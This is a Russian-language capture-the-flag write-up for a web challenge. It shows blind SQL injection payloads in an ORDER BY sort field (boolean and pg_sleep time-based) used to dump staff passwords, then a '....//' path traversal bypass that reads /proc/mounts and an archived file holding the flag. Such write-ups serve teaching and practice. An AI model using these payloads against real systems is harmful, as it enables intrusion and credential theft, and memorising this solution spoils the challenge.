# Решение задачи «Панель допуска»

## Общая информация

- **Уровень:** Easy
- **Категория:** web
- **Уязвимости:** blind SQLi (time-based и boolean-based) в `ORDER BY` + path traversal с обходом фильтра (произвольное чтение файлов)
- **Вектор атаки:** SQLi в сортировке журнала → дамп всей таблицы `staff` → перебор, у кого есть доступ к панели → path traversal в экспорте файлов → `/proc/mounts` → флаг

---

## Шаг 1. SQLi в сортировке журнала → дамп `staff`

На странице `/journal` — журнал выдачи карт, который сортируется кликом по заголовку колонки. Клик отправляет `POST /archive/access-log` с полем `sort`. Это единая точка инъекции — сервер не различает поля и одинаково подставляет `sort` прямо в SQL без проверки, независимо от того, какое имя колонки туда пришло:

```sql
SELECT log_date, username, room, device, status FROM access_log ORDER BY {sort}
```

Любая ошибка на сервере гасится — ответ всегда выглядит одинаково (просто таблица в порядке по умолчанию). Значит, классический SQLi по тексту ошибки не сработает, но извлекать данные можно двумя способами.

**Boolean-based.** При успешной инъекции реальный порядок строк виден прямо в JSON-ответе, поэтому условие можно читать по самому порядку, без какой-либо задержки:

```
sort=(CASE WHEN (1=1) THEN log_date ELSE username END)  → строки идут по дате
sort=(CASE WHEN (1=2) THEN log_date ELSE username END)  → строки идут по имени
```

Это самый быстрый вариант — ответ приходит мгновенно, различие видно по тому, какое поле реально использовано для сортировки.

**Time-based.** Работает тем же приёмом, но через задержку ответа вместо видимого порядка строк — удобнее, если не хочется парсить и сравнивать порядок строк в коде солвера.

Пример одиночной проверки (если условие верно — ответ придёт с задержкой ~1 секунда):

```
sort=(CASE WHEN (ASCII(SUBSTRING((SELECT password FROM staff WHERE username='night_shift'),6,1))>96) THEN (SELECT 1 FROM pg_sleep(1)) ELSE 1 END)
```

Символ извлекается не прямым сравнением (`SUBSTRING(...)='a'`), а через `ASCII(SUBSTRING(...))>N` и бинарный поиск по диапазону 32–126. Так можно вытащить вообще любой символ, включая одинарную кавычку в одном из паролей (`n1ght'sh1ft2018`), не заботясь об экранировании в payload — сравнение идёт по числу, а не по тексту.

Повторяя такую проверку для каждой позиции строки, сначала находим список таблиц:

```sql
SELECT string_agg(table_name, ',') FROM information_schema.tables
WHERE table_schema='public' AND table_type='BASE TABLE'
-- access_log,badges,staff
```

В БД нет никакой пометки, какая из трёх учёток `staff` — оператор, так что логин заранее не известен. Дампим всю таблицу целиком:

```sql
SELECT string_agg(username || ':' || password, ';') FROM staff
-- dr_demon:d3m0n_2018;mr_fade:f4d3_2018;night_shift:n1ght'sh1ft2018
```

## Шаг 2. Находим, у кого есть доступ к панели

Логинимся по очереди под каждой из трёх дампнутых пар — все три входят честно, это обычные валидные учётки.

Различие видно на `/panel`: `dr_demon` и `mr_fade` видят только «Недостаточно допуска», а `night_shift` — «Экспорт протокола». Это и есть целевая учётка: `night_shift` / `n1ght'sh1ft2018`.

## Шаг 3. Path traversal в экспорте файлов → флаг

В панели оператора есть «Экспорт протокола»:

```
GET /panel/export?file=export_2018.log
```

Эндпоинт отдаёт файлы из каталога выгрузок. Защита от выхода за пределы папки проверяет только явное `../` и один раз вырезает его из строки — то есть не рекурсивно. Поэтому строка `....//` после такой чистки снова становится `../`:

```
"....//".replace("../", "") == "../"
```

Это и есть обход. Читаем `/proc/mounts`, чтобы узнать, что ещё примонтировано в контейнер:

```
GET /panel/export?file=....//....//proc/mounts
```

В списке монтирований видно смонтированный архив лаборатории — `/var/lib/labx/archive`. Само по себе чтение каталога через этот эндпоинт не работает, поэтому нужно само имя файла — оно есть в «Примечании оператора» на `/panel`: «копия протокола лежит в архиве, файл `ledger.txt`». Поднимаемся туда тем же способом и читаем его:

```
GET /panel/export?file=....//....//....//....//....//var/lib/labx/archive/ledger.txt
```

В файле — запись о входе по допуску 000 от 2018-11-02 с затёртым именем оператора и строкой `FLAG=...`.
